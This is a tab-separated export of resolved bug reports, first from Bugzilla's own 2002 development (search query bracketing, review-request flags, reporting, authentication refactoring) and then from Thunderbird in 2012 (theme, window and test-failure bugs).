179697%TAB%1037075140%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%OR terms need extra level of bracketing%TAB%OR terms need extra level of bracketingThe url here does  'short_desc' 'allwordssubstr' 'foo bar' OR 'status_whiteboard' 'allwordssubstr' 'foo bar'  This becomes  (INSTR(LOWER(bugs.short_desc), 'foo') AND INSTR(LOWER(bugs.short_desc), 'bar') OR INSTR(LOWER(bugs.status_whiteboard), 'foo') AND INSTR(LOWER(bugs.status_whiteboard), 'bar'))  instead, it should be:  ((INSTR(LOWER(bugs.short_desc), 'foo') AND INSTR(LOWER(bugs.short_desc), 'bar')) OR (INSTR(LOWER(bugs.status_whiteboard), 'foo') AND INSTR(LOWER(bugs.status_whiteboard), 'bar')))  Note the extra bracketing. Without this, the query is read left to right, and is asking for all bugs where:  short_desc contains 'foo' AND (short_desc contains 'bar' OR (whiteboard contains foo AND whiteboard contains bar)))  which isn't optimisiable easily, and so this then becomes basically a full db search. The bugzilla sidebar generates queries like this - see bug 179500.  The fix is to change              if (@orlist) {                 push(@andlist, "(" . join(" OR ", @orlist) . ")");             }  in Bugzilla::Search to do the @orlist join by bracketing each term first before doing the bracketing for pusshin to @andlist.  To make the queries simpler/easier to read, we may want to only add the extra bracketing if scalar(@orlist) > 1.
179706%TAB%1037076851%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%activity log needs to include full account names for requestees%TAB%activity log needs to include full account names for requesteessomeone named 'timeless' just got a real review request. there are a few accounts by that name on bmo, for timeless it's more of a record keeping problem that a real problem. but there are 118 users found for http://bugzilla.mozilla.org/editusers.cgi?action=list&matchstr=%5Edavid%40&matchtype=regexp so when someone views the activity log for any bug where someone asked any of those david's to review, they won't be able to find out which one was asked.   another case: brendan's - 8 users found http://bugzilla.mozilla.org/editusers.cgi?action=list&matchstr=%5Ebrendan%40&matchtype=regexp  Here's a sample bugmail: http://bugzilla.mozilla.org/show_bug.cgi?id=113202 neil@parkwaycc.co.uk changed:            What    |Removed                     |Added ----------------------------------------------------------------------------   Attachment #94708 [details] [diff]|                            |review?(timeless),  here's how it appears in the bug: neil: review? (timeless)  and in the log http://bugzilla.mozilla.org/show_activity.cgi?id=113202 neil@parkwaycc.co.uk 2002-11-12 04:36:37 Attachment #94708 [details] [diff] Flag   review?(timeless), superreview?(jaggernaut)
179876%TAB%1037137946%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%label requestee field to reduce confusion%TAB%label requestee field to reduce confusionThere's confusion about the requestee field that causes users to enter data into it at times when it isn't necessary or is harmful.  Disabling the field when the flag isn't being requested is helpful but not a complete solution.  The field should be labeled as well.
179881%TAB%1037144024%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Attachments & Requests%TAB%requests link in footer should be 'my requests'%TAB%requests link in footer should be 'my requests'Theres currently a request link in the footer. It should default to requests where the current user is the requestee.  The full current queue is too large to be of use to most people. If we had the ability, makng it list requests made by the user would be good too, but we don't (although a query.cgi option for 'show request queue' would probably be nice, which would then allow 'preset request queries')  I'd prefer this to be a general thing, rather than a bmo footer.html.tmpl customisation
179886%TAB%1037150200%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%request.cgi should not |use diagnostics;|%TAB%request.cgi should not |use diagnostics;|request.cgi should not |use diagnostics;|
179887%TAB%1037150347%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%report.cgi should |require Data::Dumper|, not |use|%TAB%report.cgi should |require Data::Dumper|, not |use|report.cgi should |require Data::Dumper|, not |use|
179960%TAB%1037182329%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%QuickSearch queries are slow and time out%TAB%QuickSearch queries are slow and time outQuickSearch queries are so slow they time out, making them useless and dragging the server's performance down with them.  Single site searches from the Mozilla search sidebar have the same problem.  I've disabled QuickSearch on b.m.o until the problem gets resolved and will look into blocking Mozilla sidebar searches as well.
180005%TAB%1037195057%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Updates to Bugzilla FAQ%TAB%Updates to Bugzilla FAQA.1.3. Where can I get commercial support for Bugzilla?   should make reference to http://www.buzilla.org/consulting.html  A.1.4 Who uses Bugzilla?   remove AtHome... they don't exist anymore, I think :)  A.1.5 Who maintains Bugzilla?   my address is now justdave@netscape.com :)  A.1.8 Why MySQL?   support for both Postgres and Sybase is planned for 2.18.  A.2.3 multiple products   the 55 group limit is gone.  It's now only limited to the number of unique keys available in the database (smallint, or about 32 thousand)  A.2.5 attachment types   Bugzilla will now autodetect the attachment mime-type based on what your web browser thinks the file is when you upload it.  A.2.7 reporting   The reporting system just got a complete overhaul.  I'm not sure what to change here, but I know it can do a lot more than it used to.  A.2.11 import/export   buglist.cgi now allows output in both RDF and CSV formats (CSV can be imported into Excel).  There is a link at the bottom of the page for redisplaying the page in CSV format.  For RDF you need to add &ctype=rdf on the end of the URL (RDF is intended to only be machine readable, so it's assuming a program would be accessing that URL)   The report system now allows CSV output of several of the reports, as well.  A.2.12 translated/localized versions   The answer to this is now Yes.  An up-to-date list of the known translations can always be found at http://www.bugzilla.org/download.html in the "Localized templates" section.  A.2.13 Can the user create and save reports...   Yes. No.  Yes (sort of - CSV format can be read by Excel)  A.4.2 Need bugzilla to only send mail to me   The name of the param is "newchangedmail"  A.5.1 Bugzilla with Oracle?   RedHat Bugzilla has been updated to 2.17.1 and supports Postgres, not Oracle. RedHat no longer supports the Oracle version.  Their Postgres code will be getting merged with mozilla.org Bugzilla (so it will support both MySQL and Postgres) within the next month.  The work we are doing towards getting Bugzilla to work with Postgres and Sybase should make it much easier for someone else to port it to Oracle later if they wanted to.  A.5.3 Modifying the database   the "mysql" command-line shell is a bit easier to use than running everything through mysqladmin.  Might not hurt to mention that instead.  There are various GUI MySQL admin programs floating around now, too.  You can find several of them for Windows and Mac by searching for "mysql" on versiontracker.com  A.5.4 Password error in mysql 3.23.(29/30)   This entry is obsolete.  Bugzilla a) now requires a newer version of MySQL than that, and b) no longer uses MySQL's crypt() function anyway (uses Perl's instead)  A.5.5 Can't connect to MySQL   You should add to this that if this solves their problem then they need to redo their permissions for the user Bugzilla is connecting as within MySQL.  A.7.5 attachment names are .cgi   In 2.17.1 you can now edit the filena
180086%TAB%1037234626%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%Rename 'count' column in votes tables%TAB%Rename 'count' column in votes tablesThe table definition for the votes table include a column named "count".  Sybase won't let me use this as a column name because it conflicts with the built-in count() function.
180105%TAB%1037245281%TAB%35981%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%CSV reports occasionally break%TAB%CSV reports occasionally breakUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021016 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021016  When attempting to view a buglist produced by a report as a csv, bugzilla will return the Internal Error page.  Reproducible: Always  Steps to Reproduce: 1.Go to http://bugzilla.mozilla.org/query.cgi?format=report-table 2.Select Assignee on vertical axis, Products on horizontal axis, and Bugzilla as Product. Generate the report. 3.From the report click on the link for Total for bbaetz@student.usyd.edu.au 4.From the buglist click on CSV at the bottom page. 5.Sit back and enjoy the error page (which BTW isn't rendered in mozilla)  Actual Results:   Error page  Expected Results:   It should have returned a CSV list of the buglist on the previous page
180151%TAB%1037265254%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Grand total links are messed up when axis is restricted%TAB%Grand total links are messed up when axis is restrictedSteps to Reproduce: 1.Go to http://bugzilla.mozilla.org/query.cgi?format=report-table 2.Select Assignee on vertical axis, Products on horizontal axis, and Bugzilla as Product. Generate the report. 3.From the report click on the link for Grand Total, in the bottom right.  You get all ASSIGNED bugs ever. You should get all ASSIGNED bugs in the Bugzilla product.
180232%TAB%1037288082%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%remove unnecessary border/margin on xul duplicates tree%TAB%remove unnecessary border/margin on xul duplicates treeThe XUL version of the duplicates report has some unnecessary space on either side of the tree.  This makes it harder to use for users with maximized browser windows because it looks like moving the cursor all the way to the right will grab the XUL tree's scrollbar, but instead it grabs the border/margin.  This border/margin doesn't seem to have any useful purpose and should be removed.
180255%TAB%1037301618%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Tabular report CSV downloads should suggest csv filename and have funny format.%TAB%Tabular report CSV downloads should suggest csv filename and have funny format.When generating a CSV file for a tabular report, the suggested filename is defaulting to buglist.cgi.   This should be a name with a .csv extension.
180257%TAB%1037304814%TAB%57900%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications,User Interface%TAB%incorrect padding around words on "cancel email address change" page%TAB%incorrect padding around words on "cancel email address change" pageSteps to Reproduce: 1. Goto prefs 2. Change your email address 3. When the request arrives, hit click the cancel link 4. You'll be brought to a page where it says the request was cancelled.  There is a padding error (there should be a space and there is none) where there is no space between the last word before the email address.  This occurs before both email addresses.
180259%TAB%1037306465%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%"Requests" link appears in footer even if the site doesn't use requests,"My Requests" link appears in footer even if the site doesn't use requests,"Requests" (loogged out) and "My Requests" (logged in) links appear in footer even if the site doesn't use requests,"Requests" (logged out) and "My Requests" (logged in) links appear in footer even if the site doesn't use requests%TAB%"Requests" link appears in footer even if the site doesn't use requests,"My Requests" link appears in footer even if the site doesn't use requests,"Requests" (loogged out) and "My Requests" (logged in) links appear in footer even if the site doesn't use requests,"Requests" (logged out) and "My Requests" (logged in) links appear in footer even if the site doesn't use requestsIf there are no flags defined, the "Requests" link shouldn't appear in the page footer.  If the site isn't using it, it's pointless to link to a page that'll never have anything on it.
180444%TAB%1037396418%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Attachments & Requests%TAB%Request tracker misattributes requests redirected to new requestees%TAB%Request tracker misattributes requests redirected to new requesteesRequest initially was nonspecific then bacame directed.  The notification to reviewers indicated that the original requester had assigned the request to the new requestee even though the requestee was assigned by someone else.
180460%TAB%1037421182%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%request.cgi doesn't filter list of products/components%TAB%request.cgi doesn't filter list of products/componentsThe product list (and the subsequent components) aren't being filtered based on buggroups.  We probably want a GetEnterableProducts thing which ignores the versioncache and does a single db query instead - it'd be faster than iterating though the versioncache list + a db query for each.  request.cgi has the extra   It may be easier to wait for joel's group stuff to land for this, though, or create the sub as part of that, and then fix requests.cgi here, or something along those lines.
180541%TAB%1037480122%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%request email should use "granted" rather than "approved"%TAB%request email should use "granted" rather than "approved"request email uses the word "approved" when it should be using the word "granted" (which makes more sense in sentences where the thing being acted upon is a status flag, f.e. "approved review" vs. "granted review").
180544%TAB%1037480403%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%generally requestable flags display requestee field%TAB%generally requestable flags display requestee fieldGenerally requestable flags display the requestee field even though the field is useless for them.
180545%TAB%1037482284%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%You can change the product/component on a bug without editbugs privs%TAB%You can change the product/component on a bug without editbugs privsBryan Wellander changed the product from mozilla.org to NSPR.  He doesn't have any privs (neither canconfirm nor editbugs).  He's also not the reporter, qa, or assignee on that bug.  I always thought that was one of the fields that was supposed to be protected if you weren't a primary relationship to that bug and you didn't have editbugs privs...
180563%TAB%1037498524%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%requesting flag of specific user by substring on installation with usermatchmode=off silently fails%TAB%requesting flag of specific user by substring on installation with usermatchmode=off silently fails1. Turn off user matching. 2. Turn on specific requestability for a flag. 3. Request the flag of a specific user by entering a subset of that user's name.  Actual Results: The flag is set to flag? but not requested of a specific user. Expected Results: An error is thrown that the username was invalid.
180632%TAB%1037542122%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%Flag.pm references flag->is_requesteeble instead of flag->type->is_requesteeble%TAB%Flag.pm references flag->is_requesteeble instead of flag->type->is_requesteebleFlag.pm references flag->is_requesteeble instead of flag->type->is_requesteeble, which causes the logic for determining when flags have changed to fail.
180635%TAB%1037542468%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%Enhance Bugzilla::User to store additional information%TAB%Enhance Bugzilla::User to store additional informationAll the stuff currently in GetUserInfo should be moved, and the stuff requring joins to other tables should possibly be lazily queried.
180642%TAB%1037543744%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%Move authentication code into a module%TAB%Move authentication code into a modulequictly_check_login and confirm_login need to move into a module. I'm thinking of an API of:  package Bugzilla::Auth;  sub auth_from_cgi {   my ($cgi, $required) = @_;   ...   {     no strict 'refs';     require Param('authModule');     my $ok = Param('authModule')::authenticate($userid, $pw); # Or whatever the syntax is   }   ...   $cgi->add_cookie(...);   ...   # Backwards compat wrapper will just return the userid.   return new Bugzilla::User($userid); }  We then have a Bugzilla::Auth::DB and Bugzilla::Auth::LDAP, with at least B::A::DB defined in the same file for simplicity.  Or I could just call it |auth|, and either check the isa of the first argument, or use auth_from_foo for the other (less common) forms of authentication.
180692%TAB%1037589051%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%enter_bug shows keywords option even if keywords are disabled%TAB%enter_bug shows keywords option even if keywords are disabledThe bug entry page shows the option to add a keyword even if no keywords are defined. It should check @::legal_keywords like the entry page does.
180792%TAB%1037623945%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,Attachments & Requests%TAB%request tracker does not update last changed date,setting and/or updating flags does not update last changed date%TAB%request tracker does not update last changed date,setting and/or updating flags does not update last changed dateThe request tracker changes do no update the last changed date. They should.   Steps to reproduce: file a bug. create an attachment. note the last changed date. make a request for that attachment. note the last changed date.
180812%TAB%1037630707%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Can't search for non-obsolete attachments with a particular flag,Boolean charts involving both flags and attachments should limit the flag search based on the attachment criteria%TAB%Can't search for non-obsolete attachments with a particular flag,Boolean charts involving both flags and attachments should limit the flag search based on the attachment criteriasearching for 'flag' 'is' 'review+' AND 'attachment is obsolete' 'not equal' '1' doesn't work, because theres no link between the flag part of the query and the attachment part of the query.  Not sure how to handle this with bug flags - we could LEFT JOIN from flags to attachments, but then the join for the obsolete bit wouldn't match, and we'd have duplicate table defs (we have a nopther bug somewhere where a similar situation occurs, so we may end up having to change the duplicate code)
180870%TAB%1037658110%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Remove old shadowdb manual replicaiton code,Remove old shadowdb manual replication code%TAB%Remove old shadowdb manual replicaiton code,Remove old shadowdb manual replication codeRemove old shadowdb manual replicaiton code,  Remove old shadowdb manual replication code
180878%TAB%1037673538%TAB%21302%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%bugzilla.org%TAB%Security leak on announcement page or bugs that should be visible.%TAB%Security leak on announcement page or bugs that should be visible.The status update is publicly visible. The links to security sensitive bugs are  not only visible, but actually highlighted. The bugs they point to are not  publicly visible though.  Either the bugs should be publicly visible to allow the patches to be  downloaded, or the security sensitive bugs should not be advertised in the  announcement in this way.
180879%TAB%1037673958%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Anyone can change bug flags,Implement privs for bug flags modification control,Implement privs for bug flags modification%TAB%Anyone can change bug flags,Implement privs for bug flags modification control,Implement privs for bug flags modificationPeople w/o editbugs can only edit attachment flags on patches they attached. That got inherited from the old attach status stuff.  However, there isn't a corresponding restriction on bug flags. My suggestion is:  - require editbugs to +/- a bug flag - assignee can ?/cancel a bug flag  Should the reporter be able to make requests? What about the qa contact? I'm leaning towards saying no, and we can always revisit this.  Its definately not useful for stuff like approval, which is what bmo will be using it for, but I can imagine it being useful in other contexts. OTOH, such sites can edit the sub in process_bug.
180955%TAB%1037708036%TAB%15368%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Investigate dual-license,Remove dual-license from test files%TAB%Investigate dual-license,Remove dual-license from test filesHere's my view: the Mozilla project picked the tri-license for particular reasons which are applicable to Mozilla, and in order to promote wide use of its code. Those reasons do not, in my view, apply to Bugzilla. In addition, I know there are some Bugzilla contributors who don't like the tri-license (Hixie, for one.)   Any attempt to tri-license the entirety of Bugzilla would be a large effort for extremely little gain. We would need to contact anyone who'd ever contributed a patch - and that's a lot of people.   If we are not going to tri-license the entire app, then I also think it's wrong to tri-license parts of it. We have found the hard way that having different licenses on different bits of code merely causes extreme confusion.  I therefore think we should leave the Bugzilla standard licenses as MPL-only, and bring all files into line with that. 
180966%TAB%1037713558%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%warnings in web server error log%TAB%warnings in web server error logThe process_bug ones can be fixed by wrapping an |if (UserInGroup(Param('timetracking'))| arround those blocks.  You also need to |$::FORM{dontchange} ||= "";|.  Both of those have been done in my Bug.pm rewrite, although I guess I could pull them out for this bug
820306%TAB%1355189477%TAB%7289%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%chrome://messenger/skin/messenger.css uses invalid 'auto' value for padding-bottom property%TAB%chrome://messenger/skin/messenger.css uses invalid 'auto' value for padding-bottom propertyAttachment Reminders not triggering due to removal of nsIMutationObserverCallback (Permanent Orange | TEST-UNEXPECTED-FAIL | test-attachment-reminder.js) Bug 790978 removed nsIMutationObserverCallback but it looks like we don't actually need it.
817502%TAB%1354491204%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | multiple-identities/test-display-names.js test_no_header_name_in_abook_no_pdn (got 'null' but expected 'My Buddy'),Permanent orange: TEST-UNEXPECTED-FAIL | multiple-identities/test-display-names.js | test_no_header_name_in_abook_no_pdn (got 'null' but expected 'My Buddy')%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | multiple-identities/test-display-names.js test_no_header_name_in_abook_no_pdn (got 'null' but expected 'My Buddy'),Permanent orange: TEST-UNEXPECTED-FAIL | multiple-identities/test-display-names.js | test_no_header_name_in_abook_no_pdn (got 'null' but expected 'My Buddy')This popped up over the weekend:  SUMMARY-UNEXPECTED-FAIL | test-display-names.js | test-display-names.js::test_no_header_name_in_abook_no_pdn   EXCEPTION: got 'null' but expected 'My Buddy'     at: test-display-names.js line 99        help_test_display_name test-display-names.js 99        test_no_header_name_in_abook_no_pdn test-display-names.js 159        Runner.prototype.wrapper frame.js 582        Runner.prototype._runTestModule frame.js 652        Runner.prototype.runTestModule frame.js 698        Runner.prototype.runTestDirectory frame.js 522        runTestDirectory frame.js 704        Bridge.prototype._execFunction server.js 179        Bridge.prototype.execFunction server.js 183  https://tbpl.mozilla.org/php/getParsedLog.php?id=17541618&tree=Thunderbird-Trunk#error2  Regression range:   http://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=0e6c4d6047db&tochange=ecdf0e332f17  I've currently got a bisect running to investigate further as the failure isn't obvious.  Mconley, I can see these nulls displayed while using the current trunk build. It happens if the To recipient has the yellow star beside the name in the header pane. The recipient is in an addressbook. For me, the recipient was in the Collected addresses addressbook. As soon as I deleted him from it, the address displayed properly in the msg header pane. I didn't even need to reselect the msg or anything. Well, the result of FormatDisplayName function is not null but "null" (a string) now. And that is no longer falsy as we expect in later code.  It is because aDocumentNode.getAttribute("displayName") returns "null" (string). And that is because before that we .setAttribute("displayName", null) [not string]. Bz, is that something that the patch in bug 814195 intended?
817390%TAB%1354427420%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%make click_account_tree_row() in test-account-manager-helpers.js check sanity of its arguments%TAB%make click_account_tree_row() in test-account-manager-helpers.js check sanity of its argumentsMake click_account_tree_row() in test-account-manager-helpers.js check sanity of its arguments. This will enable to remove all those "assert_not_equals(accountRow, -1);" checks I added in bug 805953.  Also make get_account_tree_row() dump a warning if it didn't find the wanted account/pane.  This should allow for a much better log output about why the click failed.
815220%TAB%1353921347%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Theme%TAB%Icons are missing in folder picker in main toolbar%TAB%Icons are missing in folder picker in main toolbarhttps://dl.dropbox.com/u/2301433/Screenshots/MissingIcons.png  This is fallout from bug 795989 - apparently we forgot folderMenus.css when we cleaned up our icons.  Any chance you could whip up a fix, Paenglab?
814630%TAB%1353632194%TAB%456887%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Thunderbird 17.0 closes all windows if multiple are opened%TAB%Thunderbird 17.0 closes all windows if multiple are openedUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/17.0 Firefox/17.0 Build ID: 20121119183901  Steps to reproduce:  Reproduced with Windows 7 Ultimate x64 SP1 and Thunderbird 17.0 Steps: 1) open Thunderbird 2) open a Mail (or something else) in a new tab within the current window 3) drag the tab out of the current window scope 4) now close either the initial window or the newly created one  Additional: After closing Thunderbird, open it anew and the multiple windows should start with the process. Now the steps 2-4 can be repeated to open more and more windows for the current instance and every time Thunderbird closes all windows. Only the manual deletion of the window-JSONs in the profile's "session.json" reverts the instance to one window.   Actual results:  Thunderbird closes ALL windows, not only the selected one.   Expected results:  Only the selected window should close and the remaining windows should stay opened. Thus draging tabs outer the current window scope should open stand-alone windows.  The same happens when you use Exit from menu. With draw in title bar the close button is using "cmd_quit" like Exit in menu. This is on every Windows system with draw in title bar except Vista/Win7 Aero. On Aero the native buttons with their system function is used. It exists also "cmd_close" but this closes only one tab after the other until the last tab is closed.
814589%TAB%1353626024%TAB%382826%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Thunderbird's Menu button has vertical lines on it that seem out-of-place%TAB%Thunderbird's Menu button has vertical lines on it that seem out-of-placeAfter upgrading to TB17, I noticed the new menu button has little vertical lines on it. After checking it on my laptop (both the desktop and laptop run Windows), it became clear it wasn't a graphics card bug. I'm not sure if they're supposed to be there, but the really seem out-of-place. After looking at them for a while, I suppose they *kinda* look like the dividers in the menu bar, but they still seem fairly out-of-place. Perhaps someone should remove them in the next update?  Also the Firefox button will change to this glyph, see: http://people.mozilla.com/~shorlander/files/australis-designSpecs/australis-designSpecs-windows7-mainWindow.html. Other OS and applications are also using this symbol for menus and this will help to faster recognize there is a menu behind this button.  I close this bug with WONTFIX because of the reasoning I wrote.  Feel free to reopen this bug if you think you have a better solution which also Firefox will use.
814414%TAB%1353563422%TAB%430982%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Untriaged,Toolbars and Tabs%TAB%Menu entries for chat is in AppMenu with mail.chat.enabled set to disable,Menu entries for chat is in AppMenu when mail.chat.enabled set to disable,Menu entries for chat is in AppMenu when mail.chat.enabled set to false,Menu entries for chat still shown in AppMenu when mail.chat.enabled set to false%TAB%Menu entries for chat is in AppMenu with mail.chat.enabled set to disable,Menu entries for chat is in AppMenu when mail.chat.enabled set to disable,Menu entries for chat is in AppMenu when mail.chat.enabled set to false,Menu entries for chat still shown in AppMenu when mail.chat.enabled set to falseUser Agent: Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1 Build ID: 20120905151427  Steps to reproduce:  mail.chat.enabled to false   Actual results:  Appmenu entries "Go -> Chat" and "Tools -> Chat status" still here   Expected results:  No menu entries for chats.
813691%TAB%1353409617%TAB%101158%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-phishing-bar.js::test_phishing_bar_for_eml_attachment,Phishing toolbar needs to be updated to use new nsIUrlListManager interface%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-phishing-bar.js::test_phishing_bar_for_eml_attachment,Phishing toolbar needs to be updated to use new nsIUrlListManager interfaceSeen starting https://hg.mozilla.org/comm-central/rev/6996e05c74ee but that hardly caused it. Some core change perhaps?  SUMMARY-UNEXPECTED-FAIL | c:\talos-slave\test\build\mozmill\message-header\test-phishing-bar.js | test-phishing-bar.js::test_phishing_bar_for_eml_attachment   EXCEPTION: Notification bar is collapsed!     at: test-folder-display-helpers.js line 2831        assert_true test-folder-display-helpers.js 2831        assert_phishing_bar_visible test-phishing-bar.js 42        test_phishing_bar_for_eml_attachment test-phishing-bar.js 89        Runner.prototype.wrapper frame.js 582        Runner.prototype._runTestModule frame.js 652        Runner.prototype.runTestModule frame.js 698        Runner.prototype.runTestDirectory frame.js 522        runTestDirectory frame.js 704        Bridge.prototype._execFunction server.js 179        Bridge.prototype.execFunction server.js 183  So, if I'm reading this correctly - this didn't just break a test; this has actually busted our ability to detect phishing emails. Nice.  Looks like just an interface change, anyhow.
813638%TAB%1353401593%TAB%22373%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Untriaged,Theme%TAB%Under Windows XP Thunderbird 17 title bar is same colour as window background instead of blue, when active and dark gray, when not active.,Under Windows Classic Theme Thunderbird 17 title bar is same colour as window background%TAB%Under Windows XP Thunderbird 17 title bar is same colour as window background instead of blue, when active and dark gray, when not active.,Under Windows Classic Theme Thunderbird 17 title bar is same colour as window backgroundUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/17.0 Firefox/17.0 Build ID: 20121119183901  Steps to reproduce:  Updated Thunderbird to version 17.  Actual results:  Under Windows XP with classic Windows theme Thunderbirds window title bar does not have correct colour (blue when active, dark gray when inactive).  Expected results:  Window title bar should be blue, when active and dark gray, when not inactive.  For info I'm seeing exactly the same effect as reported in comment 2 on Windows 7 64-bit.  Setting mail.tabs.drawInTitlebar to false makes the title bar background correct and contain the correct text.  Setting mail.tabs.drawInTitlebar to true makes the title bar background incorrect and contain no text (so you can't see which account you are looking at).
813622%TAB%1353398730%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: various oranges related to plugins%TAB%Permanent orange: various oranges related to pluginsWe've started seeing the following Mozmill failures across the board:  TEST-START | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-unknown.js | test_unknown_plugin_notification_inline Step Pass: {"function": "controller.click()"} Step Pass: {"function": "controller.waitFor()"} Test Failure: The plugin install status should have been ready: 'ready' != 'null'. TEST-UNEXPECTED-FAIL | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-unknown.js | test-plugin-unknown.js::test_unknown_plugin_notification_inline TEST-START | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-unknown.js | test_unknown_plugin_notification_bar Step Pass: {"function": "controller.click()"} Test Failure: Timeout waiting for the content tab to open TEST-UNEXPECTED-FAIL | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-unknown.js | test-plugin-unknown.js::test_unknown_plugin_notification_bar  TEST-START | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-blocked.js | test_blocklisted_plugin_notification Step Pass: {"function": "controller.click()"} Test Failure: Timeout waiting for alert TEST-START | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-blocked.js | teardownTest TEST-PASS | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-blocked.js | test-plugin-blocked.js::teardownTest TEST-UNEXPECTED-FAIL | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-plugin-blocked.js | test-plugin-blocked.js::test_blocklisted_plugin_notification  TEST-START | /home/cltbld/talos-slave/test/build/mozmill/message-header/test-phishing-bar.js | test_phishing_bar_for_eml_attachment Test Failure: Notification bar is collapsed! WARNING: gsignal.c:3078: signal name selection_changed' is invalid for instance 0x7f8afe0b70b0': 'glib warning', file ../../../../mozilla/toolkit/xre/nsSigHandlers.cpp, line 126  (thunderbird-bin:3104): GLib-GObject-WARNING **: gsignal.c:3078: signal name selection_changed' is invalid for instance 0x7f8afe0b70b0' TEST-UNEXPECTED-FAIL | /home/cltbld/talos-slave/test/build/mozmill/message-header/test-phishing-bar.js | test-phishing-bar.js::test_phishing_bar_for_eml_attachment
813299%TAB%1353328600%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%move the '#filter substitution' line in *.xul files below the <?xml?> header%TAB%move the '#filter substitution' line in *.xul files below the <?xml?> headerI found 2 occurrences in c-c: mail/base/content/messageWindow.xul mail/base/content/messenger.xul  From studying other source files it seems the "#filter substitution" line does not need to be on the first line of a file.  The <?xml?> header not being in the first line of the file causes my text editor not identify the file as XML and not applying proper syntax highlighting.  The fix seems to be a more correct way than just forcing the editor to treat all .xul files as xml.
